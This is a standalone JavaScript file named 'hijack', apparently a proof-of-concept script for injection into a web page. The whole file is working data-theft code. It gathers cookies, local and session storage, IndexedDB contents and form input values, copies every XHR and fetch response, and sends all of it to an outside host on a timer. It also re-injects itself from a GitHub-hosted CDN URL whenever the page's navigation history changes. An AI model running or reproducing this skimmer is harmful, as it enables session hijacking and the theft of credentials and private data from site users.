(async function hijack() {
  const endpoint = "https://premiumvalue.store/poc";
  const INTERVAL = 15000;
  let lastPayload = "";

  const report = async (data) => {
    const payload = JSON.stringify(data);
    if (payload !== lastPayload) {
      lastPayload = payload;
      try {
        if (!navigator.sendBeacon(endpoint, payload)) {
          await fetch(endpoint, { method: "POST", body: payload, mode: "no-cors" });
        }
      } catch {}
    }
  };

  const extractGlobals = () => {
    const keys = ["user", "HelpCenter", "zE", "analytics", "__REACT_DEVTOOLS_GLOBAL_HOOK__"];
    const result = {};
    for (const key of keys) {
      if (window[key]) {
        result[key] = window[key];
      }
    }
    return result;
  };

  const extractDOM = () => {
    return Array.from(document.querySelectorAll("input, textarea, select, [contenteditable], .sensitive, .field"))
      .filter(e => e.offsetParent !== null)
      .map(e => ({
        tag: e.tagName,
        type: e.type,
        name: e.name || e.id || null,
        value: e.value || e.innerText || null
      }));
  };

  const dumpIndexedDB = async () => {
    const out = {};
    try {
      const dbs = indexedDB.databases ? await indexedDB.databases() : [];
      for (const { name } of dbs) {
        out[name] = {};
        const req = indexedDB.open(name);
        req.onsuccess = () => {
          const db = req.result;
          for (const storeName of db.objectStoreNames) {
            const tx = db.transaction(storeName, "readonly").objectStore(storeName);
            const all = tx.getAll();
            all.onsuccess = () => {
              out[name][storeName] = all.result;
            };
            const cursor = tx.openCursor();
            cursor.onsuccess = (e) => {
              const cursorResult = e.target.result;
              if (cursorResult) {
                out[name][storeName] = out[name][storeName] || [];
                out[name][storeName].push(cursorResult.value);
                cursorResult.continue();
              }
            };
          }
        };
      }
    } catch {}
    return out;
  };

  const hookXHR = () => {
    const origOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function () {
      this.addEventListener("load", function () {
        report({ type: "xhr", url: this.responseURL, body: this.responseText });
      });
      return origOpen.apply(this, arguments);
    };
  };

  const hookFetch = () => {
    const origFetch = window.fetch;
    window.fetch = async (...args) => {
      const res = await origFetch(...args);
      try {
        const clone = res.clone();
        const text = await clone.text();
        report({ type: "fetch", url: args[0], body: text });
      } catch {}
      return res;
    };
  };

  const hookClicks = () => {
    document.addEventListener("click", (e) => {
      const t = e.target;
      if (t && (t.tagName === "INPUT" || t.tagName === "TEXTAREA")) {
        report({
          type: "click",
          name: t.name || t.id || null,
          value: t.value || null,
          url: location.href,
          ts: Date.now()
        });
      }
    }, true);
  };

  const persistOnNavigation = () => {
    const inject = () => {
      const script = document.createElement("script");
      script.src = "https://cdn.jsdelivr.net/gh/GeovaneAyala/syfe-poc-bypass@main/hijack.js";
      document.head.appendChild(script);
    };

    const hijackHistory = (fn) => {
      return function () {
        setTimeout(inject, 100);
        return fn.apply(this, arguments);
      };
    };

    history.pushState = hijackHistory(history.pushState);
    history.replaceState = hijackHistory(history.replaceState);
    window.addEventListener("popstate", inject);
  };

  const run = async () => {
    hookXHR();
    hookFetch();
    hookClicks();
    persistOnNavigation();

    setInterval(async () => {
      const data = {
        url: location.href,
        referrer: document.referrer,
        cookies: document.cookie,
        localStorage: { ...localStorage },
        sessionStorage: { ...sessionStorage },
        globals: extractGlobals(),
        inputs: extractDOM(),
        indexedDB: await dumpIndexedDB(),
        timestamp: Date.now()
      };
      await report(data);
    }, INTERVAL);
  };

  run();
})();
